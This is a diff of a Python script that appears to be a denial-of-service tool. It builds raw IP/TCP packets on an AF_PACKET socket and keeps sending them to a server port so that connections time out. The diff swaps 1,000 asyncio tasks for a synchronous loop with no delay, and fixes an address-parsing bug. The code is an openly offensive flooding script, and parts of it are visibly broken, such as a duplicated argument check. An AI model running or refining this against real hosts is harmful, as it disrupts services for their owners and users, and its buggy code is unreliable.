@@ -10,29 +10,20 @@ import sys
 ###### This only runs on linux #########
 
 # Delay factor, some noise is added.
-DELAY = 1
-
-# Number of concurrent requests that are happening, threads are not used.
-# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
-# and add a line like vita soft nofile 2000
-# and vita hard nofile 40000
-# You can check the status of these limits with ulimit -Hn and ulimit -Sn
-CONCURRENT_REQUESTS = 1000 
+DELAY = 0
 
 # Prints the string with no newline, and flushes.
 def pfl(s: str):
     print(s, end='')
     sys.stdout.flush()
 
-async def hit_server(target: str):
-    await asyncio.gather(
-        *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
-        )
+def hit_server(target: str):
+    papercut(target)
 
 # Returns an ipv4 address in 1.2.3.4 format as a binary string
 def ip_bin(ip: str):
     out = ""
-    for i in ".".split(ip):
+    for i in ip.split("."):
         out += chr(int(i))
     return out
 
@@ -48,7 +39,7 @@ def b16s(port: int):
 
 # Single job that will keep attempting to 
 # send requests to the server that _will_ time out.
-async def papercut(target: str, i):
+def papercut(target: str):
     # AF_PACKET needs root
     soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW) 
     soc.bind(("wlp1s0", 0))
@@ -70,16 +61,13 @@ async def papercut(target: str, i):
             "\x2e\xdf\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x07\x0d\xd1\x3c" +
             "\x00\x00\x00\x00\x01\x03\x03\x07")
         pak = ip_packet + tcp_packet
-        await soc.send(pak)
-        pfl('S') # sent a packet
-        await asyncio.sleep(random.random()*DELAY)
-    soc.close() # probably never gets here
+        soc.send(pak.encode())
 
 if __name__ == '__main__':
     import sys
     target = None
     if len(sys.argv) == 1:
-        target = ('localhost', 25565) # some open tcp port
+        target = ('127.0.0.1', 25565) # some open tcp port
     elif len(sys.argv) == 1:
         target = sys.argv[1]
-    asyncio.run(hit_server(target))
+    hit_server(target)
